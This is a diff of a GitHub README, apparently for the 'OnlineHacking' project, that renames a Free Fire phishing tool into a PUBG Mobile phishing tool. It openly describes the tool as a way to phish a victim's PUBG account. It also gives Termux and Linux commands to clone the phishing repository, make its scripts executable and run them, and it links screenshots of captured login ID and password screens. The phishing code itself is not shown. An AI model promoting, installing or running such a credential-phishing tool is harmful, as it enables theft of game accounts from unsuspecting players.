@@ -1,28 +1,28 @@
-<h1 align="center">Free Fire Phishing - OnlineHacking</h1>
+<h1 align="center">PUBG Mobile Phishing - OnlineHacking</h1>
 <p align="center">
-  FreeFire ID Hack Use Termux
+  PUBG ID Hack Use Termux
 </p>
 <p align="center">
-<a href="https://www.onlinehacking.xyz/2021/03/FreeFireID-Hack.html"><img title="Made in INDIA" src="https://img.shields.io/badge/MADE%20IN-INDIA-SCRIPT?colorA=%23ff8100&colorB=%23017e40&colorC=%23ff0000&style=for-the-badge"></a>
-</p>
-
-</p>
-<p align="center">
-<a href="https://www.onlinehacking.xyz/2021/03/FreeFireID-Hack.html"><img title="Made in INDIA" src="https://img.shields.io/badge/Tool-FREEFIRE_PHISHING-green.svg"></a>
-<a href="https://www.onlinehacking.xyz/2021/03/FreeFireID-Hack.html"><img title="Version" src="https://img.shields.io/badge/Version-2.2-green.svg?style=flat-square"></a>
-<a href="https://www.onlinehacking.xyz/2021/03/FreeFireID-Hack.html"><img title="Maintainence" src="https://img.shields.io/badge/Maintained%3F-yes-green.svg"></a>
+<a href="https://www.onlinehacking.xyz/2021/03/PUBG-Mobile-ID-Hack.html"><img title="Made in INDIA" src="https://img.shields.io/badge/MADE%20IN-INDIA-SCRIPT?colorA=%23ff8100&colorB=%23017e40&colorC=%23ff0000&style=for-the-badge"></a>
 </p>
 
+</p>
+<p align="center">
+<a href="https://www.onlinehacking.xyz/2021/03/PUBG-Mobile-ID-Hack.html"><img title="Made in INDIA" src="https://img.shields.io/badge/Tool-PUBG_PHISHING-green.svg"></a>
+<a href="https://www.onlinehacking.xyz/2021/03/PUBG-Mobile-ID-Hack.html"><img title="Version" src="https://img.shields.io/badge/Version-2.2-green.svg?style=flat-square"></a>
+<a href="https://www.onlinehacking.xyz/2021/03/PUBG-Mobile-ID-Hack.html"><img title="Maintainence" src="https://img.shields.io/badge/Maintained%3F-yes-green.svg"></a>
+</p>
+
 <p align="center">
 
-![unnamed (2)](https://1.bp.blogspot.com/-1wb4xEP0dRg/YEYUOrDo6PI/AAAAAAAAFR0/dVrZhurI2rIb86lwrao1gmysX2nwD2U-QCLcBGAsYHQ/s1280/500033300005_273526.jpg)
+![unnamed (2)](https://1.bp.blogspot.com/-_PpGY-YxDW8/YD3OSDOE-PI/AAAAAAAAFQ8/Wqro4aRUMAAPid8GiQjD0XLx12IQbdnsgCLcBGAsYHQ/s1280/500034600110_255557.jpg)
 
 </p>
 
 
 ## ABOUT TOOL :
 
-FREEFIRE-PHISING IS A PHISING TOOL WICH IS USED TO PHISH A FREEFIRE ACCOUNT OF YOUR VICTIM. This tool works on both rooted Android device and Non-rooted Android device.
+PUBG-PHISING IS A PHISING TOOL WICH IS USED TO PHISH A PUBG ACCOUNT OF YOUR VICTIM. This tool works on both rooted Android device and Non-rooted Android device.
 
 ### AVAILABLE ON :
 
@@ -78,17 +78,17 @@ pkg upgrade -y
 
 pkg install git 
 
-git clone https://github.com/OnlineHacKing/FreeFire-Phishing.git
+git clone https://github.com/OnlineHacKing/PUBG-Phishing.git
 
-cd FreeFire-Phishing
+cd PUBG-Phishing
 
 chmod +x *
 
-./Android-Setup
+./Andriod-Setup
 ```
 There are 2 Tool Script for Android (Use Any Tool)
 ```
-onlinehacking-freefire
+onlinehacking-pubg
 ```
 ```
 ./OnlineHacking-Phishing.sh
@@ -103,9 +103,9 @@ sudo apt upgrade -y
 
 sudo apt install git 
 
-git clone https://github.com/OnlineHacKing/FreeFire-Phishing.git
+git clone https://github.com/OnlineHacKing/PUBG-Phishing.git
 
-cd FreeFire-Phishing
+cd PUBG-Phishing
 
 chmod +x *
 
@@ -120,13 +120,13 @@ chmod +x *
 
 <br>
 <p align="center">
-<img width="45%" src="https://github.com/OnlineHacKing/FreeFire-Phishing/raw/main/img/Screenshot_20210520-121535_Termux~2-min.png"/>
-<img width="41%" src="https://github.com/OnlineHacKing/FreeFire-Phishing/raw/main/img/Screenshot_20210520-121853_Termux~2-min.png"/>
+<img width="45%" src="https://github.com/OnlineHacKing/PUBG-Phishing/raw/main/img/OnlineHacking-Suman-1-id.png"/>
+<img width="41%" src="https://github.com/OnlineHacKing/PUBG-Phishing/raw/main/img/OnlineHacking-Suman-1-pass.png"/>
 </p>
 <br>
 <p align="center">
-<img width="40%" src="https://github.com/OnlineHacKing/FreeFire-Phishing/raw/main/img/Screenshot_20210520-121309_Termux~2-min.png"/>
-<img width="41%" src="https://github.com/OnlineHacKing/FreeFire-Phishing/raw/main/img/Screenshot_20210520-121246_Termux~2-min.png"/>
+<img width="40%" src="https://github.com/OnlineHacKing/PUBG-Phishing/raw/main/img/OnlineHacking-Suman-2-id.png"/>
+<img width="41%" src="https://github.com/OnlineHacKing/PUBG-Phishing/raw/main/img/OnlineHacking-Suman-2-pass.png"/>
 </p>
 
 
